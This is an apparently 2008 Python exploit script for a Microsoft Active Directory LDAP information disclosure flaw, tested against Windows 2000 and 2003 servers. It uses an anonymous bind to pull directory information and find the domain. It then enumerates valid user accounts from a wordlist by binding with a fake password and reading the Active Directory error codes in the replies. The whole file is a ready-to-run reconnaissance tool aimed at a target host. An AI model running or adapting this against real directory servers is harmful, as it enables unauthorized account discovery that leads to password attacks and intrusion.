#!/usr/bin/env python

'''
Microsoft Windows Active Directory LDAP Server Information
Disclosure Vulnerability Exploit
(c) 2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>

License: GPLv2

Version: 0.1

References:
* http://labs.portcullis.co.uk/application/ldapuserenum/
* http://www.portcullis-security.com/40.php

Successfully tested on:
* Microsoft 2000 Server Service Pack 4 + Update Rollup 1 Full Patched at
  October 2008
* Microsoft 2003 Standard Service Pack 2 Full Patched at October 2008
'''


import os
import re
import sys
import traceback

try:
    import ldap
except:
    print 'ERROR: this tool requires python-ldap library to be installed, get it '
    print 'from http://python-ldap.sourceforge.net/ or apt-get install python-ldap'
    sys.exit(1)

from optparse import OptionError
from optparse import OptionParser


def LDAPconnect(target, port=389, version=ldap.VERSION3):
    try:
        # Connect to the remote LDAP server
        l = ldap.open(target, port)

        # Set the LDAP protocol version
        l.protocol_version = version
    except:
        print 'ERROR: unable to connect to the remote LDAP server'

    return l


def LDAPinfo(target, info=False):
    # Connect to the remote LDAP server
    l = LDAPconnect(target)

    # Retrieved machine domain
    domain = None

    # Set search requirements and directory
    baseDN = ''
    searchScope = ldap.SCOPE_BASE
    resultSet = []

    # Retrieve all LDAP attributes
    retrieveAttributes = None 
    searchFilter = 'objectClass=*'

    try:
        # Get LDAP information
        ldapResultId = l.search(baseDN, searchScope, searchFilter, retrieveAttributes)
    except ldap.SERVER_DOWN, _:
        print 'ERROR: unable to connect to the remote LDAP server'
        return domain

    while True:
        resultType, resultData = l.result(ldapResultId, 0)

        if not resultData:
            break
        elif resultType == ldap.RES_SEARCH_ENTRY:
            resultSet.append(resultData)

    results = resultSet[0][0][1]

    if results:
        if info:
            print '\n[*] LDAP information:'
    else:
        print 'Unable to perform LDAP information gathering, probably anonymous LDAP bind is forbidden'

        domain = raw_input('Please, provide the machine domain yourself: ')

        return domain

    # Print LDAP information
    for key, values in results.items():
        if info:
            print '\t[*] %s' % key

        for value in values:
            if info:
                print '\t\t[*] %s' % value

            domainRegExp = re.search('DC=([\w\.]+)', value, re.I)

            if domainRegExp:
                domain = domainRegExp.group(1)

    print

    return domain


def LDAPusersEnum(target, domain):
    # Enumerated users
    users = {}

    # Path to users list
    usersFilePath = './users.txt'
    
    # Active Directory LDAP bind errors
    # Source: http://www-01.ibm.com/support/docview.wss?rs=688&uid=swg21290631
    errorCodes = {
                   #'525': 'user not found',
                   '52e': 'invalid credentials',
                   '530': 'not permitted to logon at this time',
                   '531': 'not permitted to logon at this workstation',
                   '532': 'password expired',
                   '533': 'account disabled',
                   '701': 'account expired',
                   '773': 'user must reset password',
                   '775': 'user account locked',
                 }

    # Check if users list exists
    if not os.path.exists(usersFilePath):
        print 'ERROR: users list file %s not found' % usersFilePath
        return

    print 'Going to enumerate users taking \'%s\' file as input\n' % usersFilePath

    # Load users from a text file
    fd = open(usersFilePath, 'r')

    for user in fd.readlines():
        user = user.replace('\n', '').replace('\r', '')

        # Skip empty and commented lines
        if not user or user[0] == '#':
            continue

        # Set search requirements and directory
        baseDN = '%s@%s' % (user, domain)
        password = 'UnexistingPassword'

        try:
            # Connect and perform an LDAP bind with an invalid password and
            # request results
            l = LDAPconnect(target)
            num = l.bind_s(baseDN, password)
            result = l.result(num)

        except ldap.SERVER_DOWN, _:
            print 'ERROR: unable to connect to the remote LDAP server'
            return

        except:
            # Python LDAP library only handles a number of exception, not
            # all of the possible ones so we except globally and parse the
            # exception message to distinguish between existing and
            # unexisting user
            errorMessage = str(traceback.format_exc())

            detectedErrorCode = re.search(' data ([\w]+),', errorMessage)

            if not detectedErrorCode:
                continue

            detectedErrorCode = detectedErrorCode.group(1).lower()

            if detectedErrorCode in errorCodes.keys():
                users[user] = detectedErrorCode

    if users:
        print '[*] Enumerated users:'

        for user, detectedErrorCode in users.items():
            print '\t[*] User: %s' % user
            print '\t\t[*] LDAP error code: %s' % detectedErrorCode
            print '\t\t[*] LDAP message: %s' % errorCodes[detectedErrorCode]
    else:
        print '[*] No users enumerated'


if __name__ == '__main__':
    usage = '%s [-i] -t <target>' % sys.argv[0]
    parser  = OptionParser(usage=usage, version='0.1')

    try:
        parser.add_option('-d', dest='descr', action='store_true', help='show description and exit')

        parser.add_option('-t', dest='target', help='target IP or hostname')

        parser.add_option('-i', '--info', dest='info', action='store_true',
                          help='show LDAP information gathering results')

        (args, _) = parser.parse_args()

        if not args.descr and not args.target:
            parser.error('Missing the target, -h for help')

    except (OptionError, TypeError), e:
        parser.error(e)

    if args.descr:
        print __doc__
        sys.exit(0)

    domain = LDAPinfo(args.target, args.info)

    if domain:
        domain = str(domain).upper()
        LDAPusersEnum(args.target, domain)
